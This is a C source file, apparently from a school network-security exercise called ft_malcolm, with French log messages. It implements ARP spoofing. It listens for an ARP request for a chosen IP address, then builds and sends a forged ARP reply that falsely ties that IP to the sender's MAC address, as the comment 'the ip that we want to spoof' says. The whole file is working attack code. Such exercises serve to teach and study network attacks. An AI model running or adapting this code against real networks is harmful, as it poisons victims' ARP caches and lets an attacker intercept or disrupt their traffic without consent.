#include "../includes/ft_malcolm.h"

int wait_for_arp_request(int sockfd, t_args *args)
{
	unsigned char buffer[2048];
	ssize_t		  bytes;

	while (1)
	{
		bytes = recvfrom(sockfd, buffer, sizeof(buffer), 0, NULL, NULL);
		if (bytes < 0)
		{
			perror("recvfrom");
			return (1);
		}
		if (bytes < 42)
			continue; // ARP packet must be at least 42 bytes

		uint16_t opcode
			= ntohs(*(uint16_t *)(buffer + 14 + 6)); // ARP header + opcode

		if (opcode == 1) // ARP request
		{
			const unsigned char *target_ip
				= buffer + 14 + 24; // ARP header offset for target IP
			char ip_str[INET_ADDRSTRLEN];
			inet_ntop(AF_INET, target_ip, ip_str, sizeof(ip_str));

			if (ft_strcmp(ip_str, args->source_ip) == 0)
			{
				printf("[Info] Requête ARP reçue pour %s, cible atteinte.\n",
					   args->source_ip);
				print_arp_packet(buffer, bytes);
				return (0);
			}
		}
	}
	return (1); // in theory, this should never happen
}

void send_arp_reply(int sockfd, t_args *args)
{
	unsigned char packet[42];

	// === Ethernet Header ===
	unsigned char *eth = packet;
	unsigned char *arp = packet + 14;

	// Destination MAC
	sscanf(args->target_mac, "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx", &eth[0], &eth[1],
		   &eth[2], &eth[3], &eth[4], &eth[5]);

	// Source MAC
	sscanf(args->source_mac, "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx", &eth[6], &eth[7],
		   &eth[8], &eth[9], &eth[10], &eth[11]);

	eth[12] = 0x08; // ARP type
	eth[13] = 0x06;

	// === ARP Header ===
	ft_memset(arp, 0, 28);
	arp[0] = 0x00;
	arp[1] = 0x01; // Hardware type: Ethernet
	arp[2] = 0x08;
	arp[3] = 0x00; // Protocol type: IPv4
	arp[4] = 6;	   // Hardware size
	arp[5] = 4;	   // Protocol size
	arp[6] = 0x00;
	arp[7] = 0x02; // Opcode: reply (2)

	// Sender MAC
	sscanf(args->source_mac, "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx", &arp[8], &arp[9],
		   &arp[10], &arp[11], &arp[12], &arp[13]);

	// Sender IP (the ip that we want to spoof)
	inet_pton(AF_INET, args->source_ip, &arp[14]);

	// Target MAC
	sscanf(args->target_mac, "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx", &arp[18],
		   &arp[19], &arp[20], &arp[21], &arp[22], &arp[23]);

	// Target IP
	inet_pton(AF_INET, args->target_ip, &arp[24]);

	// === Send packet ===
	if (sendto(sockfd, packet, 42, 0, NULL, 0) < 0)
	{
		perror("sendto");
		return;
	}

	printf(COLOR_GREEN "[Info] ARP reply envoyé à la cible (%s).\n" COLOR_RESET,
		   args->target_ip);
}
